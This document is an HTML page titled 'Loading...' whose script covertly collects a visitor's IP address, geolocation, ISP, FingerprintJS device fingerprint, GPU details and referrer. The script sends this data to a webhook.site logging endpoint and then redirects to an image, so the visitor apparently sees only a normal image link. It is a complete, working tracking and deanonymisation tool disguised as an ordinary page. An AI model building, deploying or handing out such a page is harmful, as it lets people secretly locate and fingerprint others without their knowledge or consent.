<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body>
    <div style="text-align:center; padding:50px;">Loading...</div>

    <!-- Load FingerprintJS from CDN -->
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>

    <script>
        // === CONFIGURATION ===
        const LOG_ENDPOINT = "https://webhook.site/f1c52871-c825-4c3a-a85f-da2157857f28";
        const DEFAULT_REDIRECT = "https://example.com/image.jpg";
        // =====================

        function getQueryParam(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        async function collectData() {
            const data = {};

            // 1. IP Address (via ipify)
            try {
                const ipRes = await fetch("https://api.ipify.org?format=json");
                const ipJson = await ipRes.json();
                data.ip = ipJson.ip;
            } catch (e) {
                data.ip = "error: " + e.message;
            }

            // 2. IP Geolocation (via ipapi.co - free tier)
            try {
                const geoRes = await fetch("https://ipapi.co/json/");
                const geoJson = await geoRes.json();
                data.city = geoJson.city || "";
                data.region = geoJson.region || "";
                data.country = geoJson.country_name || "";
                data.latitude = geoJson.latitude || "";
                data.longitude = geoJson.longitude || "";
                data.isp = geoJson.org || "";
            } catch (e) {
                data.geo_error = e.message;
            }

            // 3. FingerprintJS v3 - precise device fingerprint
            try {
                if (typeof FingerprintJS === "undefined") {
                    throw new Error("FingerprintJS library not loaded");
                }
                
                const fp = await FingerprintJS.load();
                const result = await fp.get();
                data.fingerprint = result.visitorId;
                
                // Extract key components for detailed analysis
                const compMap = {};
                for (const comp of result.components) {
                    compMap[comp.key] = comp.value;
                }
                
                data.platform = typeof compMap.platform === 'string' ? compMap.platform : JSON.stringify(compMap.platform);
                data.browser_user_agent = typeof compMap.userAgent === 'string' ? compMap.userAgent : "";
                data.screen_resolution = JSON.stringify(compMap.screenResolution || []);
                data.hardware_concurrency = compMap.hardwareConcurrency;
                data.timezone = compMap.timezone;
                data.languages = JSON.stringify(compMap.languages || []);
                
                // Video card (GPU) - reveals device model
                if (compMap.videoCard && typeof compMap.videoCard === 'object') {
                    data.webgl_vendor = compMap.videoCard.vendor || "";
                    data.webgl_renderer = compMap.videoCard.renderer || "";
                }
                
            } catch (e) {
                data.fingerprint_error = e.message;
            }

            // 4. Referrer (shows which app they came from)
            data.referrer = document.referrer || "none";
            
            // 5. Timestamp
            data.timestamp = new Date().toISOString();

            return data;
        }

        function sendToEndpoint(data) {
            const jsonStr = JSON.stringify(data);
            
            // Method 1: navigator.sendBeacon (best for page navigation scenarios)
            if (typeof navigator.sendBeacon === "function") {
                try {
                    const blob = new Blob([jsonStr], { type: "application/json" });
                    const sent = navigator.sendBeacon(LOG_ENDPOINT, blob);
                    if (sent) return;
                } catch (e) {}
            }
            
            // Method 2: Image beacon with query params (fallback, works everywhere)
            try {
                const params = new URLSearchParams();
                for (const [key, value] of Object.entries(data)) {
                    if (typeof value === "object" && value !== null) {
                        params.append(key, JSON.stringify(value));
                    } else {
                        params.append(key, String(value || ""));
                    }
                }
                const img = new Image();
                img.src = LOG_ENDPOINT + "?" + params.toString().substring(0, 4000);
            } catch (e) {}
        }

        async function main() {
            const redirectUrl = getQueryParam("r") || DEFAULT_REDIRECT;

            try {
                // Collect all tracking data
                const data = await collectData();

                // Send to logging endpoint
                sendToEndpoint(data);
            } catch (e) {
                console.log("Error during tracking:", e);
            }

            // Always redirect after a delay, even if tracking fails
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 2000);
        }

        main();
    </script>
</body>
</html>
